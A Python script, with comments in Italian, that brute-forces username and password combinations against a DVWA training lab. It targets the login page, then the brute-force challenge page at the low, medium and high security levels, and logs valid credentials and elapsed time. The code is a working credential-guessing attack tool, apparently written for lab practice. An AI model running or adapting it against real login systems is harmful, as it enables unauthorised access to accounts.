import time

import requests


# Funzione per leggere un file e restituire una lista di linee (senza newline)
def read_file(filename):
    with open(filename, "r", errors="ignore") as file:
        return [line.strip() for line in file.readlines()]


# Funzione per tentare il brute force login
def brute_force_login(session, url, user_list, pwd_list, find_all):
    valid_credentials = []  # Lista per memorizzare le credenziali valide trovate
    for user in user_list:
        for pwd in pwd_list:
            print(f"Tentativo con: {user} - {pwd}")
            data = {
                "username": user,
                "password": pwd,
                "Login": "Login",
            }  # Dati di login
            response = session.post(url, data)  # Invio della richiesta POST
            if "Login failed" not in response.text:  # Se il login è riuscito
                print(f"\n[SUCCESSO] Login effettuato con l'account: {user} - {pwd}\n")
                valid_credentials.append(
                    (user, pwd)
                )  # Aggiungi le credenziali valide alla lista
                if not find_all:  # Se non si devono trovare tutte le combinazioni
                    return valid_credentials
    if not valid_credentials:  # Se nessuna credenziale valida è stata trovata
        print("\n[ERRORE] Nessuna combinazione valida trovata.\n")
    return valid_credentials


# Funzione per impostare il livello di sicurezza
def set_security_level(session, url, level):
    data = {
        "security": level,
        "seclev_submit": "Submit",
    }  # Dati per impostare il livello di sicurezza
    response = session.post(url, data)  # Invio della richiesta POST
    if response.status_code == 200:  # Se la richiesta è andata a buon fine
        print(f"\n[SUCCESSO] Livello di sicurezza impostato su: {level}\n")
    else:
        print("\n[ERRORE] Cambio del livello di sicurezza non effettuato.\n")


# Funzione per tentare il brute force sulle vulnerabilità
def brute_force_vulnerabilities(session, url, user_list, pwd_list, find_all):
    valid_credentials = []  # Lista per memorizzare le credenziali valide trovate
    for user in user_list:
        for pwd in pwd_list:
            print(f"Tentativo con: {user} - {pwd}")
            response = session.get(
                f"{url}?username={user}&password={pwd}&Login=Login"
            )  # Invio della richiesta GET
            if (
                "Username and/or password incorrect." not in response.text
            ):  # Se il login è riuscito
                print(f"\n[SUCCESSO] Login effettuato con l'account: {user} - {pwd}\n")
                valid_credentials.append(
                    (user, pwd)
                )  # Aggiungi le credenziali valide alla lista
                if not find_all:  # Se non si devono trovare tutte le combinazioni
                    return valid_credentials
    if not valid_credentials:  # Se nessuna credenziale valida è stata trovata
        print("\n[ERRORE] Nessuna combinazione valida trovata.\n")
    return valid_credentials


# Funzione per registrare le credenziali valide trovate e il tempo impiegato in un file di log
def log_credentials(log_file, level, credentials, elapsed_time):
    with open(log_file, "a") as file:
        file.write(f"\nLivello di sicurezza: {level}\n")
        file.write(f"Tempo impiegato: {elapsed_time:.2f} secondi\n")
        for user, pwd in credentials:
            file.write(f"Username: {user}, Password: {pwd}\n")


# Funzione principale
def main():
    # Lettura delle liste di utenti e password dai file
    user_list = read_file("usernames.txt")
    pwd_list = read_file("passwords.txt")
    log_file = "attacco_log_dvwa.txt"  # Nome del file di log

    # Richiesta all'utente dell'indirizzo IP e del percorso
    host = input("Inserisci l'indirizzo IP: ")
    url_login = f"http://{host}/dvwa/login.php"

    # Chiede all'utente se desidera trovare tutte le combinazioni valide o fermarsi alla prima trovata
    find_all = (
        input("Vuoi trovare tutte le combinazioni valide? (s/n): ").lower() == "s"
    )

    print("\nInizio di brute force all'URL di login:", url_login)
    session = requests.Session()  # Creazione di una sessione

    # Inizio misurazione del tempo
    start_time = time.time()
    # Tentativo di brute force login
    valid_login_credentials = brute_force_login(
        session, url_login, user_list, pwd_list, find_all
    )
    # Fine misurazione del tempo
    elapsed_time = time.time() - start_time

    # Registrazione delle credenziali valide e del tempo impiegato nel file di log
    log_credentials(log_file, "login", valid_login_credentials, elapsed_time)

    if not valid_login_credentials:
        return

    # URL per impostare il livello di sicurezza e per il brute force sulle vulnerabilità
    url_security = f"http://{host}/dvwa/security.php"
    url_brute_force = f"http://{host}/dvwa/vulnerabilities/brute/"

    # Lista dei livelli di sicurezza
    security_levels = ["low", "medium", "high"]

    for level in security_levels:
        print(f"\nImpostazione del livello di sicurezza su {level}")
        set_security_level(session, url_security, level)

        print(
            f"\nInizio di brute force all'URL delle vulnerabilità per il livello di sicurezza {level}:",
            url_brute_force,
        )

        start_time = time.time()
        # Tentativo di brute force sulle vulnerabilità
        valid_vulnerability_credentials = brute_force_vulnerabilities(
            session, url_brute_force, user_list, pwd_list, find_all
        )
        elapsed_time = time.time() - start_time

        # Registrazione delle credenziali valide e del tempo impiegato nel file di log
        log_credentials(log_file, level, valid_vulnerability_credentials, elapsed_time)

    print(f"\nLe informazioni dell'attacco sono state registrate nel file {log_file}")


if __name__ == "__main__":
    main()
